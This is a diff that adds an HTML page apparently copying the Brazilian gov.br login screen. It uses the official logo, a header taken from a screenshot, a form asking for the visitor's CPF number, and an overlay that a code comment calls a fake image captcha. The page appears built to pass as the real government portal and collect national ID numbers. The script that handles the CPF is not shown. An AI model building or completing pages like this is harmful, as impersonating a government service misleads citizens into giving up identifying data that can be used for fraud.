@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identifique-se no gov.br</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="gov-header-simple">
+        <div class="gov-header-content">
+            <div class="gov-logo-simple">
+                <img src="Gov.br_logo.svg.webp" alt="gov.br" class="gov-logo-img">
+            </div>
+            <div class="gov-icons">
+                <img src="Captura de Tela 2025-08-06 às 01.42.22.png" alt="Ícones" class="header-icons">
+            </div>
+        </div>
+    </header>
+
+    <main class="gov-main-simple">
+        <div class="gov-card">
+            <h1 class="gov-card-title">Identifique-se no gov.br com:</h1>
+            
+            <div class="gov-identification">
+                <div class="identification-method">
+                    <img src="id-card.png" alt="Cartão de Identidade" class="id-icon-img">
+                    <span class="id-text">Número do CPF</span>
+                </div>
+                <p class="id-description">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+            </div>
+            
+            <form id="govForm" class="gov-form">
+                <div class="form-group-simple">
+                    <label for="cpfGov" id="cpfLabel">CPF</label>
+                    <input type="text" id="cpfGov" name="cpf" placeholder="Digite seu CPF" required>
+                    <span class="cpf-error-simple" id="cpfErrorGov"></span>
+                </div>
+                
+                <button type="submit" class="gov-continue-btn">Continuar</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Captcha (fake) de verificação com imagens -->
+    <div id="captchaOverlay" class="captcha-overlay" aria-hidden="true" style="display:none;">
+        <div class="captcha-modal" role="dialog" aria-modal="true" aria-labelledby="captchaTitle">
+            <div class="captcha-card">
+                <div class="captcha-header">
+                    <div class="captcha-text">
+                        <h2 id="captchaTitle">Clique nas imagens com as mesmas espécies <strong>ANIMAIS</strong> mostradas na amostra</h2>
+                        <p>Se não houver nenhuma, clique em Avançar</p>
+                        <p class="captcha-hint"><strong>Para este teste:</strong> selecione as <strong>3 imagens de gatos</strong>.</p>
+                    </div>
+                    <div class="captcha-sample">
+                        <img src="captcha/sample-cat.jpg" alt="Amostra de animal" class="captcha-sample-img">
+                    </div>
+                </div>
+                <div class="captcha-grid">
+                    <!-- linha 1 -->
+                    <button class="captcha-item" data-animal="dog" aria-pressed="false"><img src="captcha/dog1.jpg" alt="Animal 1"></button>
+                    <button class="captcha-item" data-animal="bird" aria-pressed="false"><img src="captcha/bird1.webp" alt="Pássaro 1"></button>
+                    <button class="captcha-item" data-animal="dog" aria-pressed="false"><img src="captcha/dog2.jpg" alt="Animal 2"></button>
+                    <!-- linha 2 -->
+                    <button class="captcha-item" data-animal="cat" aria-pressed="false"><img src="captcha/cat1.jpg" alt="Gato 1"></button>
+                    <button class="captcha-item" data-animal="dog" aria-pressed="false"><img src="captcha/dog3.jpg" alt="Animal 3"></button>
+                    <button class="captcha-item" data-animal="bird" aria-pressed="false"><img src="captcha/bird2.jpg" alt="Pássaro 2"></button>
+                    <!-- linha 3 -->
+                    <button class="captcha-item" data-animal="cat" aria-pressed="false"><img src="captcha/cat2.jpg" alt="Gato 2"></button>
+                    <button class="captcha-item" data-animal="bird" aria-pressed="false"><img src="captcha/bird3.webp" alt="Pássaro 3"></button>
+                    <button class="captcha-item" data-animal="cat" aria-pressed="false"><img src="captcha/cat3.webp" alt="Gato 3"></button>
+                </div>
+                <div class="captcha-actions">
+                    <button type="button" id="captchaCancel" class="btn-secondary">Voltar</button>
+                    <button type="button" id="captchaConfirm" class="gov-continue-btn" style="max-width:200px;" disabled>Avançar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="cpf-validation.js"></script>
+</body>
+</html> 
